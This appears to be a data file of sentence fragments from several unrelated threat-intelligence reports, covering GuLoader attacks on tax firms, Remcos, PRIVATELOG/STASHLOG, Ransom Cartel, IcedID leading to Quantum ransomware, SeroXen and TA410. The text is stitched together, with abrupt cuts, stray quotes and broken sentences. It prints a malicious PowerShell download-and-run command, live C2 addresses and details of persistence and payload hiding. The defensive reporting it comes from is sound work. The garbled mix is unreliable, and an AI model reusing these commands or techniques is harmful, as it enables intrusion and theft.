            "Although some of those installers are the same as ones in this report, it seems that most of them are different, compiled as EXE files (not MSI installers) and using a variety of software packers.",
            "Those samples are probably connected with Operation Dragon Breath as described by Qi An Xin in May 2022. ",
            "Conclusion The attackers have expended some effort regarding the domain names used for their websites, trying to be as similar to the official names as possible.",
            "The fake websites are, in most cases, identical copies of the legitimate sites.",
            "As for the trojanized installers, they install the actual application that the user was interested in, avoiding suspicion of a possible compromise on the victim\u2019s machine.",

            "title: Tax firms targeted by precision malware attacks url: https://news.sophos.com/en-us/2023/04/13/tax-firms-targeted-by-precision-malware-attacks/ Financial accountant firms and CPAs are in the crosshairs this tax season, as a threat actor is targeting that industry with an attack that combines social engineering with a novel exploit against Windows computers to deliver malware called GuLoader. ",
            "At least two organizations in that industry, both Sophos customers, reported the unusual attack to us in late February and early March, as tax preparers are entering the busiest part of the season in the United States.",
            "(The tax filing deadline this year is April 17, 2023.) ",
            "The attack begins with an email that purports to solicit business from the tax preparation firm.",
            "The initial message to the target is benign, with a subject line of Prospective Client Enquiries containing nothing more than an introduction and a request for information about \u201conboarding new clients.\u201d ",
            "The email sender goes on to claim that \u201cThe CPA I used last year is retired, so here I am on the lookout for a new firm to work with.\u201d ",
            "Responding to the hook with a bigger hook If the target responds to this initial solicitation, the sender then sends a follow-up email with a link to a password-protected Zip file hosted on a cloud storage service.",
            "The Zip archive has a filename that includes the last name of the fictitious person whose purportedly sent the initial email message. ",
            "In each of the messages we saw targeting different accounting firms, the attacker used different names, such as Rodney Williamson or Sarah Knapp. ",
            "The fake sender used the same password of Fresh@123 for the Zip archive in the samples we obtained.",
            "Because the attacker only sends the link to a CPA who responds to the initial email message, very few of them were caught in spam traps.",
            "The samples we obtained had been submitted to us only after the targets realized they were being attacked. ",
            "The sender was very conversational and personable in the messages, helpfully offering that the Zip archive contains \u201cin addition to my tax transcripts for the past two years\u2026a copy of my driver\u2019s license.\u201d",
            "The attacker also asks the target \u201cWould you be available for a quick telephone call on Friday?\u201d",
            "Whoever crafted the messages has a good grasp of English-language euphemisms and tax-filing vernacular.",
            "These messages, with a few very minor spelling or grammar errors, were very hard to discern from ones that might be sent by a legitimate, prospective client of a tax firm. ",
            "Infection process based on deception ",
            "If the first stage of the process involves convincing the accounting professional to download and open the linked Zip archive, the next phase is completely out of the tax preparer\u2019s control. ",
            "The Zip archive contains two files: A Windows Shortcut (a .LNK file), and a benign decoy attachment.",
            "In the examples we received, one Zip contained a benign file named screenshot1242.jpeg and another contained a file named privatecopy.pdf. ",
            "Both of these files were the same three minute long MP3 audio recording \u2013 a file that sounds like someone playing an Oud, the stringed instrument similar to a lute used widely in the middle east. ",
            "When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn\u2019t the type of file it appears to be.",
            "Adobe Reader or a photo viewing program can\u2019t open the file. ",
            "The target would then, naturally, double click the other file in the Zip archive \u2014 a Windows Shortcut (.LNK file) labeled with a PDF file suffix and with an icon that makes it appear to be a PDF document. ",
            "Unusually, the Windows shortcut has been manipulated in such a way that Windows seems to think that it is a VBScript Script File in the shortcut\u2019s properties sheet. ",
            "The action taken by the shortcut is rendered not visible in the Properties sheet, either, in what appears to be a novel, malicious use of an exploit first publicly disclosed a year ago in a blog post by researcher @x86matthew, who works for the UK-based offensive security research company MDSec.",
            "The attackers have crafted the shortcut, by prepending a large number of space characters to the Target field in the properties, so that the Target field appears blank. ",
            "However, when viewed using a hex editor, the text content of the shortcut is rendered visible.",
            "It contains a PowerShell command that looks like the following: Invoke-WebRequest http://0x[two hex bytes].[eight digits]/fresh/fordl.vbs -OutFile",
            "C:\\Windows\\Tasks\\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\\Windows\\Tasks folder, and executes it.",
            "A second command appended to the first drops an actual PDF document (of someone\u2019s IRS form W-2, 1099, or 1040) into the same location and opens it as well, as a decoy. ",
            "The crafting of the URL was somewhat unique.",
            "The attacker seems to have made a mashup of two different formats of so-called \u201cdotless\u201d IP address (an unusual combo of the hex and \u201cdword\u201d types of dotless IPs) into a combination that isn\u2019t human-readable, but that networked applications like PowerShell can understand and interpret as valid IPv4 addresses. ",
            "The script shown above uses the address 0xC2.11808979 in the URL, which translates to the IPv4 address 194.180.48.211.",
            "We also discovered scripts that pointed to malicious files hosted on the addresses 0x6D.13561923 (109.206.240.67) and 0x05.526436 (5.8.8.100). ",
            "All of the servers hosting the malware hosted them inside of open directories.",
            "We found 29 different varieties of the VBS and 90 other encrypted and unencrypted payloads hosted in these locations.",
            "There may be others. ",
            "A heavily obfuscated VBS ",
            "The initial infector is a Visual Basic script, heavily obfuscated, and very large at more than 200KB in size.",
            "A block of base64-encoded, encrypted data comprises almost 150KB of that script, along with code that decodes and decrypts the block of base64. ",
            "The VBS contains two large variables.",
            "In the script we analyzed, these were named Ir8 and O7, respectively, but although the variable names were slightly modified in each variant of the script we examined, the overall flow was the same.",
            "These work in tandem to insert data into the Windows Registry and execute PowerShell commands. ",
            "When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes. ",
            "The PowerShell script decoded from the Ir8 variable uses Reflection.",
            "Assembly to load the final payload into memory from a Registry value without writing it to disk.",
            "The script (shown in part, below) converts several small strings to bytes, concatenates the output, performs a BXOR to decode the bytes, and then converts those bytes to ASCII text, before executing them. ",
            "And the content loaded out of the Registry?",
            "That\u2019s what comes from the O7 variable (shown in part, below, because it is too large to fit on one screenshot).",
            "The concatenated segments of base64 data from O7 get inserted into the Registry, for the Ir8 script to decode. ",
            "Post-infection, the machine will have an instance of an otherwise benign Windows binary running.",
            "On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe, used by the now defunct Internet Explorer browser for tuning the microphone settings in the browser.",
            "But the malware doesn\u2019t exclusively inject its code into this exe; Other now-defunct Internet Explorer components were also observed being abused by the malware, including ieinstal.exe (the tool that installs Add-Ons into Internet Explorer). ",
            "The malware makes several other changes to Windows settings during the infection process.",
            "It creates a User-level Environment Variable (in our test case, this was called SaltoQ), which points at the full path to the PowerShell executable on the system. ",
            "It created a Run key in the Registry named Overproduce that invokes the SaltoQ variable to run a PowerShell command at every reboot. ",
            "And that Run key references a different Registry key, in HKEY_CURRENT_USER\\Cloglike that contains a portion of the same Visual Basic Script code that was in the original .vbs payload the malware downloads during the infection process. ",
            "Once infected, the ielowutil.exe binary constantly attempts to contact its command\u2013and-control server, on 64.44.101.171:9191.",
            "During our attempts to infect machines with the malware, that C2 server failed to respond.",
            "However, we did infect a test machine with other samples from this attack, and some of those were successful at connecting to C2 servers at 84.21.172.49:1040 (ironic port number!)",
            "and 185.225.74.91:2080.",
            "Both of those C2s were live as of publication of this blog. ",
            "We also detected the infected computer repeatedly attempting to resolve the address of the domain newmansubzero.com, which is the 64.44.",
            "address above. ",
            "Guidance and detection Tax preparers and accountants are extremely busy at the best of times, but during US tax season, which culminates in mid-April, they are the busiest they will be all year.",
            "Harried CPAs from firms of all sizes must be wary that they are targets for criminals who would love nothing more than the sensitive financial data they receive in abundance at this time of year. ",
            "The attack method in this case takes advantage of the frenetic pace of tax season and uses a social engineering tactic to smooth the way for the malware to be delivered via email.",
            "As such, it\u2019s very prudent to be cautious when you\u2019re approached by potential new clients.",
            "Ask them if they will speak to you on the phone directly, who referred them to you, and if they\u2019d be willing to come in for an in-person evaluation. ",
            "Most of all, be very wary of people who send you a Dropbox link to a password-protected Zip file at any time of year.",
            "When the Zip file is password protected, it can make the contents un-scannable by endpoint security tools.",
            "If they provide a password, unzip the file and then scan the contents with an endpoint security tool before opening them. ",
            "The PDF icon used for the Shortcut in the attack is also distinctive and unique.",
            "The icon, which doesn\u2019t resemble the icon used by any known PDF reader application, looks like an icon for a plain text document wrapped in a red bar with the white letters PDF inside. ",
            "It\u2019s also notable that the icon does have the little arrow in the bottom left corner that indicates it is a Shortcut, and not a document.",
            "It\u2019s possible a busy accountant may not notice that detail. ",
            "When in doubt, you can also right-click (not left-click) the icon, one click only, and choose Properties.",
            "Even though the Properties sheet won\u2019t display the Powershell command, if the file is a Shortcut it will have a Shortcut tab (normal document files won\u2019t have those) and it accurately shows that the \u201cTarget type\u201d is a Visual Basic Script (VBScript Script File).",
            "Hovering the mouse pointer over the Shortcut icon causes the malicious shortcut to display the information pushed into the Comment field, which makes it appear that the document is in fact a PDF when it is not. ",
            "If you still suspect things are not as they should be, ask the potential customer to call you on the phone before you open the files.",
            "The attackers, in this case, seemed to limit their communication to email. ",
            "Sophos products detect various aspects of the attack quite comprehensively: Endpoint will detect the shortcut file as Troj/LnkObf-T or Mal/DownLnk-D and the VBS payload of the shortcut as VBS/Inject-IPG.",
            "Some payload samples may be detected as Behaviorally, it detects the injection techniques used by the attackers as Evade_34a or Evade_34b.",
            "GuLoader code in memory also will be detected as Mem/Guload-A. Our network security products will block communication to the IP addresses used to host the payloads and the C2 addresses. ",
            "Indicators of compromise relating to this attacker and their tooling are hosted on the Sophos X-Ops Github. ",
            "Acknowledgments Sophos X-Ops wishes to acknowledge the contributions of Colin Cowie and Benjamin Sollman of the MDR intelligence team, Sivagnanam Gn, Anand Ajjan, and Anisha Kumar of SophosLabs, and Sales Engineer Matthew Haltom to our understanding of this threat and its impacts. "

            "Tax season is particularly appealing to threat actors because not only are people busy and under stress, but it is intrinsically tied to financial information.",
            "With U.S. Tax Day approaching, Microsoft has observed phishing attacks targeting accounting and tax return preparation firms to deliver the Remcos remote access trojan (RAT) and compromise target networks beginning in February of this year. ",

            "This campaign can be detected in Microsoft Defender Antivirus, built into Windows and on by default, as well as Microsoft 365 Defender. ",
            "The campaign uses lures masquerading as tax documentation sent by a client, while the link in the email uses a legitimate click-tracking service to evade detection.",

",
            "In this post, we will share a novel and especially interesting technique the samples use to hide data, along with detailed analysis of both files that was performed with the support of FLARE analysts. ",
            "We will also share sample detection rules, and hunting recommendations to find similar activity in your environment. ",
            "Mandiant has yet to observe PRIVATELOG or STASHLOG in any customer environments or to recover any second-stage payloads launched by PRIVATELOG.",
            "This may indicate malware that is still in development, the work of a researcher, or targeted activity. ",
            "CLFS and Transaction Files PRIVATELOG and STASHLOG rely on the Common Log File System (CLFS) to hide a second stage payload in registry transaction files. ",
            "CLFS is a log framework that was introduced by Microsoft in Windows Vista and Windows Server 2003 R2 for high performance.",
            "It provides applications with API functions\u2014available in clfsw32.dll\u2014to create, store and read log data. ",
            "Because the file format is not widely used or documented, there are no available tools that can parse CLFS log files.",
            "This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions. ",
            "This is similar in nature to malware which may rely, for example, on the Windows Registry or NTFS Extended Attributes to hide their data, which also provide locations to store and retrieve binary data with the Windows API. ",
            "In Microsoft Windows, CLFS is notably used by the Kernel Transaction Manager (KTM) for both Transactional NTFS (TxF) and Transactional Registry (TxR) operations.",
            "These allow applications to perform a number of changes on the filesystem or registry, all grouped in a single transaction that can be committed or rolled back.",
            "For example, to open a registry key in a transaction, the functions RegCreateKeyTransacted(), RegOpenKeyTransacted(), and RegDeleteKeyTransacted() are available. ",
            "Registry transactions are stored in dedicated files with the following naming scheme: <hive><GUID>.TMContainer<number>.regtrans-ms or <hive><GUID>.TxR.<number>.regtrans-ms. ",
            "These are CLFS containers that are referenced in a master .blf",
            "file that only contains metadata and can be found in various locations including user profile directories. ",
            "Registry transaction forensics were briefly explored in a previous blog post.",
            "The CLFS master and container file formats are mostly undocumented; however, previous research is available on GitHub. ",
            "Malware Obfuscation As with many malware families, most of the strings used by PRIVATELOG and STASHLOG are obfuscated.",
            "Yet the technique observed here is uncommon and relies on XOR\u2019ing each byte with a hard-coded byte inline, with no loops.",
            "Effectively, each string is therefore encrypted with a unique byte stream. ",
            "Figure 1: Sample string deobfuscation for \"PrintNotify\" Interestingly, some of the deobfuscated strings from the installer are used for logging error messages and have spelling errors or typos such as: Log index=%d, data border exceed bounday.\\n Interal data hash mismatch.\\n Log buffer size=%u too small, expect aleast %u bytes.\\n Introducing STASHLOG In addition to containing obfuscated strings, the installer\u2019s code is protected using various control flow obfuscation techniques that make static analysis cumbersome.",
            "Figure 2 is a graph overview of the installer\u2019s main() function demonstrating the effects of the control flow obfuscation. ",
            "Figure 2: Graph view of main() STASHLOG has two different modes of operation: Without any arguments, during which it will prepare the environment With a single argument, which is a file that should be hidden in a CLFS file Preparing the Environment Executed without arguments, the installer prints two values to the console: The GUID returned from the registry value of HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID A 56-byte value derived from a randomly generated GUID with CoCreateGUID() Figure 3: Sample console output The 56-byte value is a concatenation of the random GUID, its SHA1 hash, and the SHA1 hash of the previous values.",
            "So: GUID+sha1(GUID)+sha1(GUID+sha1(GUID)). ",
            "The randomly generated GUID is stored as a string in the GlobalAtom table, prefixed with win::.",
            "This table resides in memory and contains strings with their identifiers available to all applications. ",
            "If a string prefixed with win:: already exists when the installer is executed, then the pre-existing GUID in the GlobalAtom table is reused. ",
            "Effectively, when executed with no arguments, the installer generates and prints out encryption keys that the actor uses to pre-encrypt the payload before it is written to disk. ",
            "Stashing the Payload When launched with an argument, the installer opens and decrypts the contents of the file passed as an argument.",
            "It verifies that the file is suffixed by its SHA1 hash, and then generates the same 56-byte value using the stored GlobalAtom GUID string in memory. ",
            "The 56-byte value is SHA1 hashed again and the first 16-bytes form the initialization vector (IV), while the key is the 16-byte MachineGUID value from the host\u2019s registry.",
            "The encryption algorithm is HC-128, which is rarely seen used in malware. ",
            "The expected decrypted file contents have a 40-byte header: struct payloadHeader { DWORD magic; DWORD minWinVer; DWORD maxWinVer; DWORD totalSize; WORD numBlocks; WORD unknown; BYTE sha1sum[20]; } In the analyzed installer, the \u201cmagic\u201d value is referred to as a checksum; however, STASHLOG verifies this value matches the hard-coded value 0x00686365.",
            "The number of blocks, specified at offset 16, must be between 2 and 5.",
            "The malware also checks that the operating system version is within a lower and upper boundary and that the SHA1 hash of the decrypted data matches the payload header value at offset 20. ",
            "Following the payload header, the malware expects blocks of encrypted data with 8-byte headers.",
            "Each block header has the following structure: struct blockHeader { DWORD magic; DWORD blockSize; } Once the malware has checked and validated the structure of the payload, it searches for .blf files in the default user\u2019s profile directory and uses the .blf file with the oldest creation date timestamp. ",
            "In practice, the malware should typically find the file used for registry transaction logs: C:\\Users\\Default\\NTUSER.DAT<GUID>.TM.blf If a matching .blf file is indeed found, it is opened with the CreateLogFile() API from clfsw32.dll.",
            "This function opens CLFS logs and expects a file name in the following format, without the .blf extension: log:<LogName>[::<LogStreamName>] The log file is reset using the CloseAndResetLogFile() function and will be opened again to insert the data. ",
            "Before inserting data into the CLFS log file, the malware decrypts each block using HC-128.",
            "The key is the 16-byte atom GUID and the IV is the first 16-bytes of the atom GUID SHA1 hash.",
            "Each block is then re-encrypted with the new key material as follows: The encryption key is the 16-byte GUID from GetVolumeNameForVolumeMountPointW().",
            "The IV is the first 16-bytes of the SHA1 hash of the concatenated GUIDs from: GetVolumeNameForVolumeMountPointW() The registry value HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID The contents are written to the CLFS log file using the clfsw32.dll API function ReserveAndAppendLog().",
            "The payload header is written to the log file as the first entry, followed by separate entries for each block. ",
            "The data is effectively stored in the first container file for the registry transaction log: C:\\Users\\Default\\NTUSER.DAT<GUID>.TMContainer00000000000000000001.regtrans-ms. ",

            "It contains exports, which mimic those of legitimate prntvpt.dll files, although the exports have no functionality.",

            "This function is patched using Microsoft Detours\u2014a publicly available library used for instrumenting Win32 functions\u2014so that the execution flow appears to happen in the legitimate service DLL. ",
            "The patched ServiceMain function is where PRIVATELOG executes most of its functionality. ",
            "Similarly to STASHLOG, PRIVATELOG starts by enumerating *.blf files in the default user\u2019s profile directory and uses the .blf file with the oldest creation date timestamp. ",
            "If a matching .blf file is found, PRIVATELOG opens it with the clfsw32.dll function CreateLogFile().",
            "The log file is then marshalled and parsed using other functions specific to CLFS, such as CreateLogMarshallingArea(), ReadLogFile() and ReadNextLogFile().",
            "The malware expects to find specific entries which match our analysis of the installer. ",
            "PRIVATELOG expects the first log entry to have the following format: ",
            "A size greater than 40 (payload header size)",
            "A WORD value of 2, 3, 4, or 5 at offset 16 (number of blocks) ",
            "If the first entry matches the aforementioned criteria, then subsequent records are read until one has an 8-byte header with the following: Its first DWORD must equal 2 (assumed magic value) ",

            "Ransom Cartel Overview We first observed Ransom Cartel around mid-January 2022.",
            "Security researchers at MalwareHunterTeam believe the group to have been active since at least December 2021.",
            "They observed the first known Ransom Cartel activity and noticed several similarities and technical overlaps with REvil ransomware. ",
            "There are a number of theories about the origins of Ransom Cartel.",
            "One theory in the community suggests that Ransom Cartel could be the result of multiple groups merging.",
            "However, researchers at MalwareHunterTeam have put forward that one of the groups believed to have merged has denied any connection with Ransom Cartel.",
            "Additionally, Unit 42 has seen no connection between these groups and Ransom Cartel other than that many of them have connections to REvil. ",
            "At this time, we believe that Ransom Cartel operators had access to earlier versions of REvil ransomware source code, but not some of the most recent developments (see our Ransom Cartel and REvil Code Comparison for more details). ",
            "This suggests there was a relationship between the groups at some point, though it may not have been recent. ",
            "Unit 42 has also observed Ransom Cartel group breaching organizations, with the first known victims observed by us around January 2022 in the U.S. and France.",
            "Ransom Cartel has attacked organizations in the following industries: education, manufacturing, and utilities and energy.",
            "Unit 42 incident responders have also assisted clients with response efforts in several Ransom Cartel cases. ",
            "Like many other ransomware gangs, Ransom Cartel leverages double extortion techniques.",
            "Unit 42 has observed the group taking an aggressive approach, threatening not only to publish stolen data to their leak site, but also to send it to the victim\u2019s partners, competitors and the news in an effort to inflict reputational damage. ",
            "Ransom Cartel typically gains initial access to an environment via compromised credentials, which is one of the most common vectors for initial access for ransomware operators.",
            "This includes access credentials for external remote services, remote desktop protocol (RDP), secure shell protocol (SSH) and virtual private networks (VPNs).",
            "These credentials are widely available in the cyber underground and offer threat actors a reliable means to gain access to victims' corporate networks. ",
            "These credentials can also be obtained through the work of ransomware operators themselves or by purchasing them from an initial access broker. ",
            "Initial access brokers are actors who offer to sell compromised network access.",
            "Their motivation is not to carry out cyberattacks themselves but rather to sell the access to other threat actors.",
            "Due to the profitability of ransomware, these brokers likely have working relationships with RaaS groups based on the amount they are willing to pay. ",
            "Unit 42 has seen evidence that Ransom Cartel has relied on this type of service to gain initial access for ransomware deployment. ",
            "Unit 42 has also observed Ransom Cartel encrypting both Windows and Linux VMWare ESXi servers in attacks on corporate networks. ",
            "Tactics, Techniques and Procedures Observed During Ransom Cartel Attacks Unit 42 observed a Ransom Cartel threat actor using a tool called DonPAPI, which has not been observed in past incidents.",
            "This tool can locate and retrieve Windows Data Protection API (DPAPI) protected credentials, which is known as DPAPI dumping. ",
            "DonPAPI is used to search machines for certain files known to be DPAPI blobs, including Wi-Fi keys, RDP passwords,",
            "credentials saved in web browsers, etc.",
            "To avoid the risk of detection by antivirus (AVs) or endpoint detection and response (EDR), the tool downloads the files and decrypts them locally.",
            "To compromise Linux ESXi devices, Ransom Cartel uses DonPAPI to harvest credentials stored in web browsers used to authenticate to the vCenter web interface. ",
            "We also observed the threat actor using additional tools, including LaZagne to recover credentials stored locally and Mimikatz to steal credentials from host memory. ",
            "In order to establish persistent access to Linux ESXi devices, the threat actor enables SSH after authenticating to vCenter.",
            "The threat actor will create new accounts and sets the account\u2019s user identifier (UID) to zero.",
            "For Unix/Linux users, a UID=0 is root.",
            "This means any security checks are bypassed. ",
            "The threat actor was observed downloading and using a cracked version of a legitimate tool called PDQ Inventory, which is a legitimate system management solution that IT administrators use to scan their network and collect hardware, software and Windows configuration data.",
            "Ransom Cartel used this as a remote access tool to establish an interactive command and control channel and to scan the compromised network. ",
            "Once a VMware ESXi server is compromised, the threat actor launches the encryptor, which will automatically enumerate the running virtual machines (VMs) and shut them down using the esxcli command.",
            "Terminating the VM processes ensures that the ransomware can successfully encrypt VMware-related files. ",
            "During encryption, Ransom Cartel specifically seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.",
            "These extensions are associated with ESXi snapshots, log files, swap files, paging files and virtual disks.",

            "This case covers the activity from a campaign in late September of 2022.",
            "Post exploitation activities detail some familiar and some new techniques and tooling, which led to domain wide ransomware. ",
            "This case shares similarities of the IcedID campaign detailed by Malware-Traffic-Analysis.net, where the ADGet.exe application was referenced. ",
            "This intrusion began by the execution of IcedID malware contained within an ISO image.",
            "The ISO file was delivered to the victim as part of a malspam campaign.",
            "Delivering payloads using an ISO image is a common technique observed in several prior cases.",
            "This technique has grown in use as threat actors look to evade Mark-of-the-Web controls. ",
            "The ISO image delivered a hidden directory containing a IcedID payload and a batch file.",
            "After being successfully mounted, the end user only sees a malicious LNK file named documents inside the virtual hard drive.",
            "Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user\u2019s AppData\\Local\\Temp folder and loads it using rundll32.",
            "A scheduled task was created at that time to maintain persistence on this host as well. ",
            "Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc.",
            "Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL rapuab1.dll was executed from the IcedID malware.",
            "This led to another round of discovery using net followed by AdFind. ",
            "The threat actor installed Atera and Splashtop remote access software via an MSI file named hp.msi.",
            "After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus.",
            "The threat actor then proceeded to exploit CVE-2020-1472, aka ZeroLogon.",
            "This was followed by a batch script used to perform DNS lookups on hosts across the environment.",
            "After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service.",
            "They then repeated the install of the remote access software package. ",
            "Some two hours later, a Cobalt Strike beacon named Nigu.exe was executed.",
            "With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory.",
            "Another round of activity took place using system tools, batch files, and Adget.",
            "Several more beacons were also loaded on the host using DLLs and PowerShell. ",
            "At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems.",
            "They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.",
            "These actions, however, failed to get a beacon to launch on the domain controller being targeted.",
            "After an hour or so of failures, the threat actors proceeded to RDP to the domain controller.",
            "Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt. Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.).",
            "These beacons, however, continued to crash and fail to run.",
            "Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain.",
            "The Cobalt Strike beacons then began to execute successfully on the domain controller.",
            "Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities. ",
            "A few hours later, the threat actors installed the RSAT tools onto the beachhead host.",
            "However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment.",
            "Back on the domain controller, ProcDump was used to dump LSASS memory.",
            "The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network. ",
            "The threat actors went quiet for around seven hours.",
            "When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation.",
            "For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed.",
            "During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers.",
            "A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment.",
            "These discovery actions were completed several times again in other various batch files. ",
            "On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity.",
            "Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.",
            "Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike. ",
            "After completing this activity, they used Rclone to exfiltrate copies of the backup files to the Mega.io cloud storage service.",
            "The threat actors then staged a ransomware binary named locker_64.exe on the backup server but did not immediately execute it. ",
            "Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target.",
            "This appeared to fail.",
            "The threat actors then proceeded to execute the payload manually in several ways, across various hosts.",
            "Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec. ",
            "Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion.",
            "The time to ransomware was just over 78 hours from the initial IcedID infection.",
            "All domain joined systems were encrypted with Quantum ransomware. ",

            "As we can see below using LECmd from Eric Zimmerman, the file documents.lnk points to max\\eyewear.bat. As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat The batch file eyewear.bat then executed two commands: It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user\u2019s AppData\\Local\\Temp\\ folder : C:\\Windows\\system32\\cmd.exe /c",

            "Executive summary SeroXen is a new Remote Access Trojan (RAT) that showed up in late 2022 and is becoming more popular in 2023.",
            "Advertised as a legitimate tool that gives access to your computers undetected, it is being sold for only $30 for a monthly license or $60 for a lifetime bundle, making it accessible. ",
            "Key takeaways: SeroXen is a fileless RAT, performing well at evading detections on static and dynamic analysis. ",
            "The malware combines several open-source projects to improve its capabilities.",
            "It is a combination of Quasar RAT, r77-rootkit and the command line NirCmd. ",
            "Hundreds of samples have shown up since its creation, being most popular in the gaming community.",
            "It is only a matter of time before it is used to target companies instead of individual users. ",
            "Analysis Quasar RAT is a legitimate open-source remote administration tool.",
            "It is offered on github page to provide user support or employee monitoring.",
            "It has been historically associated with malicious activity performed by threat actors, APT groups (like in this Mandiant report from 2017), or government attacks (in this report by Unit42 in 2017). ",
            "It was first released in July 2014 as \u201cxRAT\u201d and renamed to \u201cQuasar\u201d in August 2015.",
            "Since then, there have been released updates to the code until v1.4.1 in March 2023, which is the most current version.",
            "As an open-source RAT tool with updates 9 years after its creation, it is no surprise that it continues to be a common tool used by itself or combined with other payloads by threat actors up to this day. ",
            "In a review of the most recent samples, a new Quasar variant was observed by Alien Labs in the wild: SeroXen.",
            "This new RAT is a modified branch of the open-source version, adding some modifications features to the original RAT.",
            "They\u2019re selling it for monthly or lifetime fee.",
            "Figure 1 contains some of the features advertised on their website. ",
            "Figure 1.",
            "SeroXen features announced on its website. ",
            "This new RAT first showed up on a Twitter account, established in September 2022.",
            "The person advertising the RAT appeared to be an English-speaking teenager.",
            "The same Twitter handle published a review of the RAT on YouTube.",
            "The video approached the review from an attacking/Red Team point of view, encouraging people to buy the tool because it is worth the money.",
            "They were claiming to be a reseller of the tool. ",
            "In December 2022, a specific domain was registered to market/sell the tool, seroxen[.]com.",
            "The RAT was distributed via a monthly license for $30 USD or a lifetime license of $60 USD.",
            "It was around that time that the malware was first observed in the wild, appearing with 0 detections on VirusTotal. ",
            "After a few months, on the 1st of February, the YouTuber CyberSec Zaado published a video alerting the community about the capabilities of the RAT from a defensive perspective.",
            "In late February, the RAT was advertised on social media platforms such as TikTok, Twitter, YouTube, and several cracking forums, including hackforums.",
            "There were some conversations on gaming forums complaining about being infected by malware after downloading some video games.",
            "The artifacts described by the users matched with SeroXen RAT. ",
            "The threat actor updated the domain name to seroxen[.]net by the end of March.",
            "This domain name was registered on March 27th, 2023, after seroxen[.]com was decommissioned.",
            "The threat actor used GoDaddy for registration and Cloudflare for hosting the website.",
            "These domains are only used for selling and marketing purposes, and not for Command and Control (C&C) communications. ",
            "Figure 2: SeroXen website Based on the packed versions uploaded to VT, it appears that the RAT is being used for targeting video game users.",
            "Several lure injector cheat files have been observed with names invoking popular videogames such as Fortnite, Valorant, Roblox or Warzone2.",
            "The threat actor used Discord for the distribution of some of the samples. Figure 3.",
            "SeroXen timeline. ",
            "One of the most relevant announced features is that it is a fully undetectable version.",
            "This is currently true from a static analysis point of view, since the RAT is packaged into an obfuscated PowerShell batch file.",
            "The file\u2019s size typically ranges between 12-14 megabytes, as we can see in sample 8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87 uploaded to VT on May 21.",
            "Due to its relatively large size, certain antivirus may choose not to analyze it, potentially bypassing detection.",

            "TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa.",
            "TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its LookBack blogpost.",
            "A year later, the then-new and very complex malware family called FlowCloud was also attributed to TA410. ",
            "In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET.",
            "This very complex backdoor contains interesting espionage capabilities.",
            "ESET will present its latest findings about TA410, including results from ongoing research, during Botconf 2022.",
            "For YARA and Snort rules, consult ESET\u2019s GitHub account. ",
            "Key points in this blogpost: TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog and JollyFrog, each with its own toolset and targets. ",
            "ESET telemetry shows victims all around the world, mainly in the governmental and education sectors. ",
            "TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., ProxyLogon in March 2021 and ProxyShell in August 2021. ",
            "ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT.",
            "It has several interesting capabilities, including: Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected. ",

            "TA410 is one of the users of the Royal Road malicious document builder. ",
            "TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target. ",
            "The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn\u2019t implemented in the loaders we analyzed.",
